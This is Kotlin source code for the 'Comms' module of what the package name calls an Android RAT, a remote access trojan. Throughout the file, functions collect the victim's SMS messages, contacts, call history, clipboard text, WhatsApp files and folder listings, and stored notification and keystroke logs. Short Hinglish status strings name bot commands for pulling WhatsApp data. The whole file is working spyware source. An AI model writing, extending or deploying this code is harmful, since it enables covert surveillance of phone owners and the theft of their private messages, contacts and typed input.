package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.ClipboardManager
import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import com.venice.rat.core.U
import java.io.File

@SuppressLint("MissingPermission")
object Comms {

    fun sms(ctx: Context, limit: Int = 40): String {
        val sb = StringBuilder()
        runCatching {
            ctx.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null,
                Telephony.Sms.DATE + " DESC")?.use { c ->
                var n = 0
                while (c.moveToNext() && n < limit) {
                    n++
                    val dir = when (c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.TYPE))) {
                        1 -> "IN"; 2 -> "OUT"; else -> "?" }
                    sb.appendLine("[$dir] ${c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))}")
                    sb.appendLine("  ${U.esc(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).take(160))}")
                    sb.appendLine()
                }
            }
        }
        return sb.toString().ifBlank { "no sms" }
    }

    fun contacts(ctx: Context, limit: Int = 300): String {
        val sb = StringBuilder()
        runCatching {
            ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null)?.use { c ->
                var n = 0
                while (c.moveToNext() && n < limit) {
                    n++
                    sb.appendLine("${U.esc(c.getString(c.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))} : " +
                        c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                }
            }
        }
        return sb.toString().ifBlank { "no contacts" }
    }

    fun calls(ctx: Context, limit: Int = 60): String {
        val sb = StringBuilder()
        runCatching {
            ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC")?.use { c ->
                var n = 0
                while (c.moveToNext() && n < limit) {
                    n++
                    val t = when (c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                        CallLog.Calls.INCOMING_TYPE -> "IN"
                        CallLog.Calls.OUTGOING_TYPE -> "OUT"
                        CallLog.Calls.MISSED_TYPE -> "MISS"
                        else -> "?" }
                    sb.appendLine("[$t] ${c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))}")
                }
            }
        }
        return sb.toString().ifBlank { "no call log" }
    }

    fun clip(ctx: Context): String = runCatching {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "(empty)"
    }.getOrDefault("(clipboard fail)")

    fun waFiles(ctx: Context): List<File> {
        val res = ArrayList<File>()
        listOf(File(U.sd(), "WhatsApp"),
            File(U.sd(), "Android/media/com.whatsapp/WhatsApp")).filter { it.exists() }
            .forEach { base -> base.walkTopDown().take(6000).forEach { if (it.isFile) res.add(it) } }
        return res
    }

    fun waTree(ctx: Context): String {
        val sb = StringBuilder()
        listOf(File(U.sd(), "WhatsApp"), File(U.sd(), "Android/media/com.whatsapp/WhatsApp"))
            .filter { it.exists() }.forEach { base ->
                sb.appendLine("<b>${U.esc(base.absolutePath)}</b>")
                base.listFiles()?.forEach {
                    sb.appendLine(" - ${U.esc(it.name)} (${if (it.isDirectory) "dir" else U.size(it.length())})")
                }
            }
        return sb.toString().ifBlank { "WhatsApp nahi mila / access nahi" }
    }

    fun waKey(): String = "root ke bina key nahi milegi.\n" +
        "Rasta: /wanotif (live) + /wamedia (media) + /wadb (encrypted backup)"

    fun notifLog(ctx: Context, limit: Int = 80): String {
        val f = File(ctx.filesDir, "notif.txt")
        if (!f.exists()) return "listener on nahi hai"
        return f.readLines().takeLast(limit).joinToString("\n")
    }

    fun waOnly(ctx: Context, limit: Int): String {
        val f = File(ctx.filesDir, "wa.txt")
        if (!f.exists()) return ""
        return f.readLines().takeLast(limit).joinToString("\n")
    }

    fun keyLog(ctx: Context, limit: Int = 300): String {
        val f = File(ctx.filesDir, "keylog.txt")
        if (!f.exists()) return "accessibility on nahi hai"
        return f.readLines().takeLast(limit).joinToString("\n")
    }
}
